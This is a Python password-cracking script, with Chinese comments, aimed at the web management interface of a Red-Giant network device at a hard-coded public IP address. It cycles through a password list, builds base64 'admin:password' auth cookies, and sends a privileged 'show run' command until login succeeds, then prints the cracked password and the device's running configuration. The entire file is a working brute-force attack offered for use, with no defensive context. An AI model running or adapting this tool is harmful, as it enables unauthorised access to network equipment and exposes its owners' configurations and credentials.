import requests
import base64

headers = {
    "Authorization": "Basic YWRtaW46YWRtaW4=",
    "Origin": "http://211.142.65.173:8000",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36",
    "Content-Type": "text/plain;charset=UTF-8",
    "Accept": "*/*",
    "Referer": "http://211.142.65.173:8000/index.htm",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
    "Connection": "close"
}

url = "http://211.142.65.173:8000/WEB_VMS/LEVEL15/"
data = "command=show%20run&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.".encode()


def crackpwd(cookie):
    headers['Cookie'] = cookie
    try:
        # [print(x,y) for x,y in headers.items()]
        r = requests.post(url=url, data=data, headers=headers, timeout=5)
        content = r.content
        flag = "authentication failed"  # 登录失败关键字
        if content:
            if flag not in content.decode():
                return content
    except:
        pass


def ckgen(pwd: bytes):  # auth=admin:admin
    p = "admin" + ":" + pwd.decode()
    ecpwd = base64.b64encode(p.encode())
    ecpwd = ecpwd.decode().replace('=', '%3D')  # string

    ck = "currentURL=; DngTw7fCgAxowrI%3D=w47DmsKhwqlzXMOCw5PDqsOQTMK%2FwpZ1ZDbCnDTCigvDmXbDnUg%3D; auth={}; wqbChV3DkkUcwqI7=wpA5w4bDlVlXw4wf; user=admin".format(
        ecpwd)
    r = crackpwd(ck)
    return r


if __name__ == '__main__':
    with open('pwd.txt') as f:
        i = 0
        while True:
            line = f.readline().strip()
            i = i + 1
            print(i, line)
            if line:
                s = "{}".format(line).encode()
                ret = ckgen(s)
                if ret is not None:
                    print(line, ret)  # 没有找到失败关键字就结束程序，打印当前爆破的密码
                    break
            else:
                break
